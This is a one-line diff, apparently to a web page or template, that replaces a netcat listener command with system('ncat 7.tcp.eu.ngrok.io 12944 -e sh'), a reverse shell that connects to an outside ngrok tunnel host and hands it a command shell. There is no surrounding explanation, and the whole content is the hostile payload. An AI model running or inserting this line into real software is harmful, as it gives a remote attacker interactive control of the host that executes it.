@@ -1,1 +1,1 @@
-<pre>system('nc -lvnp 1337')</pre>
+<pre>system('ncat 7.tcp.eu.ngrok.io 12944 -e sh')</pre>
